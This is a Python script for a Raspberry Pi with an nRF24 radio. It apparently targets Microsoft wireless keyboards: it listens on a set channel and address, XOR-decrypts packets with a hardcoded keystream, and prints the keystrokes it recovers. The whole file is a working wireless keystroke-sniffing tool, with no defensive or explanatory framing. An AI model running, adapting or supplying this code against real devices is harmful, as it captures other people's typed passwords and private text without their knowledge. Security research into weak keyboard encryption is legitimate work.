#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys, os
import threading
import time
from usbhid import HIDKeyboard

from RF24 import *
import RPi.GPIO as GPIO

class App(threading.Thread):
    def __init__(self, address, address_len, channel, keystream):
        self.address = int(address, 16)
        self.keystream = keystream.decode('hex')
        self.radio = RF24(RPI_V2_GPIO_P1_22, RPI_V2_GPIO_P1_24, BCM2835_SPI_SPEED_8MHZ)
        self.radio.begin()
        self.radio.setPALevel(RF24_PA_MAX)
        self.radio.setAutoAck(False)
        self.radio.setAddressWidth(address_len)
        self.radio.disableCRC()

        self.radio.stopListening()
        self.radio.setPayloadSize(20)
        self.radio.setDataRate(RF24_2MBPS)
        self.radio.setChannel(channel)
        self.radio.openReadingPipe(1, self.address)
        self.radio.startListening()

        super(App, self).__init__()
        self._is_running = True
        self.seq = 0

    def parse(self, data):
        tmp_seq = data[4] + (data[5] << 8)
        res = []
        if self.seq == tmp_seq: 
            return []
        self.seq = tmp_seq
        if data[7] & 0x01:
            res.append('LeftControl')
        if data[7] & 0x10:
            res.append('RightControl')
        if data[7] & 0x02:
            res.append('LeftShift')
        if data[7] & 0x20:
            res.append('RightShift')
        if data[7] & 0x04:
            res.append('LeftAlt')
        if data[7] & 0x40:
            res.append('RightAlt')
        if data[7] & 0x08:
            res.append('LeftWin')
        if data[7] & 0x80:
            res.append('RightWin')
        if data[9] == data[10] == data[11] == data[12] == data[13] == data[14] == 0:
            return res
        if data[9] == data[10] == data[11] == data[12] == data[13] == data[14] == 1:
            return ['Too many buttons pressed']
        for i in range(9, len(data)): 
            if data[i] != 0:
                #print type(data[i])
                res.append(HIDKeyboard[data[i]][0])
        return res

    def decode(self, payload):
        data = [ord(i) for i in payload.decode('hex')]
        res = data

        for i in range(4,len(data)):
            data[i] = data[i] ^ ord(self.keystream[(i-4)%5])
        tmp = self.parse(data)
        if tmp != []:
            print tmp
#        for i in data: 
#            sys.stdout.write('%02x' % (i))
#        print

    def run(self):
        self.radio.startListening()
        while (self._is_running):
            while (self.radio.available()):
                    data = self.radio.read(20)
                    hex_data = str(data).encode('hex')
                    self.decode(hex_data[1:31])
            time.sleep(0.1)

    def stop(self):
        print 'Stopping thread'
        self._is_running = False

if __name__ == "__main__":
    if len(sys.argv) > 1:
        app = App(address=sys.argv[1], address_len=5, channel=70, keystream = 'cd79d67ca9')
    else:
        app = App(address='2f9acf39a8', address_len=5, channel=70, keystream = 'cd79d67ca9')
        #app = App(address='2f9acf39a8', address_len=5, channel=80, keystream = 'cd79d67ca9')
        #app = App(address='2f9acf39a8', address_len=5, channel=50, keystream = 'cd79d67ca9')
        #app = App(address='2f9acf39a8', address_len=5, channel=30, keystream = 'cd79d67ca9')
        #app = App(address='0a781e', address_len=3, channel=80)
    app.daemon = True
    app.start()
    while True:
        try:
            time.sleep(0.01)
        except KeyboardInterrupt:
            app.stop()
            sys.exit(0)root@mitm:/opt/microsoft_keyboard_decoder
